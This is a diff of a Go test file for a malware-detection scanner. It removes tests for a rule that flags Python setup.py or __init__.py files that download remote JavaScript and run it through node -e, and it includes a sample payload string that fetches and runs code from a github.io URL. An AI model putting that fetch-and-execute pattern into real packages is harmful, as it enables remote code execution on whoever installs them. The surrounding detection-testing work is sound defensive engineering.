@@ -551,65 +551,9 @@ func fullBuiltinMatcher(t *testing.T) *pattern.Matcher {
 	return pattern.NewMatcher(compiled)
 }
 
-func pyImportTimeRemoteJSFires(t *testing.T, m *pattern.Matcher, relPath, content string) bool {
-	t.Helper()
-	findings, err := m.Analyze(context.Background(), &scanner.Target{RelPath: relPath, Content: []byte(content)})
-	require.NoError(t, err)
-	for _, f := range findings {
-		if f.RuleID == "PY_IMPORTTIME_REMOTE_JS_001" {
-			return true
-		}
-	}
-	return false
-}
-
-// TestPyImportTimeRemoteJS_TargetPrecision: the rule fires only in
-// import/setup-time files (setup.py, __init__.py). The identical payload
-// in a regular module or in docs must NOT fire -- that file-context
-// restriction is how "import-time execution context" is enforced.
-func TestPyImportTimeRemoteJS_TargetPrecision(t *testing.T) {
-	m := fullBuiltinMatcher(t)
-	payload := "import urllib.request, subprocess\n" +
-		"js = urllib.request.urlopen('https://ddjidd564.github.io/x.js').read().decode()\n" +
-		"subprocess.run(['node', '-e', js])\n"
-
-	require.True(t, pyImportTimeRemoteJSFires(t, m, "pkg/__init__.py", payload), "should fire in __init__.py")
-	require.True(t, pyImportTimeRemoteJSFires(t, m, "setup.py", payload), "should fire in setup.py")
-	require.False(t, pyImportTimeRemoteJSFires(t, m, "pkg/util.py", payload), "must not fire in a regular module (not import-time context)")
-	require.False(t, pyImportTimeRemoteJSFires(t, m, "README.md", payload), "must not fire in documentation")
-}
-
-// TestPyImportTimeRemoteJS_RequiresAllThreeSignals: in an import-time
-// file, any single missing signal (remote fetch / Node execution /
-// JavaScript payload reference) means no finding. This is what keeps
-// ordinary packages that merely fetch config or run a local node build
-// from tripping the rule.
-func TestPyImportTimeRemoteJS_RequiresAllThreeSignals(t *testing.T) {
-	m := fullBuiltinMatcher(t)
-	cases := []struct {
-		name    string
-		content string
-	}{
-		{"fetch + node, no JS payload", "import requests, subprocess\nx = requests.get('https://e/data').text\nsubprocess.run(['node', '-e', x])\n"},
-		{"fetch + JS, no node execution", "import requests\njs = requests.get('https://e/x.js').text  # fetched but never run\n"},
-		{"node + JS, no remote fetch (local build)", "import subprocess\nsubprocess.run(['node', 'build.js'])\n"},
-		// Fetches a .js asset AND runs node, but node runs a local FILE
-		// (no -e), so it never executes the fetched payload. Requiring
-		// the eval form (node -e / --eval) keeps this from false-firing.
-		{"fetch .js + local node build (node runs a file, not -e)", "import requests, subprocess\njs = requests.get('https://cdn.example/foo.js').text\nsubprocess.run(['node', 'scripts/build.js'])\n"},
-		// Signals scattered on unrelated lines: fetch a config.json,
-		// a local inline node -e build, and a .js listed in package_data.
-		// None of these is a remote-JS execution, and binding the fetch
-		// to a .js URL keeps it from firing.
-		{"unrelated signals: config fetch + local node -e + package_data .js", "import requests, subprocess\ncfg = requests.get('https://cdn.example/config.json').json()\nsubprocess.run(['node', '-e', 'console.log(1)'])\nDATA = {'pkg': ['static/app.js']}\n"},
-	}
-	for _, tc := range cases {
-		t.Run(tc.name, func(t *testing.T) {
-			require.False(t, pyImportTimeRemoteJSFires(t, m, "setup.py", tc.content),
-				"a missing signal must not produce a finding")
-		})
-	}
-}
+// PY_IMPORTTIME_REMOTE_JS_001 moved from a YAML pattern rule to the
+// pyrisk analyzer (a real fetch->eval binding rather than co-presence);
+// its tests now live in internal/engine/pyrisk.
 
 func rsBuildWalletExfilFires(t *testing.T, m *pattern.Matcher, relPath, content string) bool {
 	t.Helper()
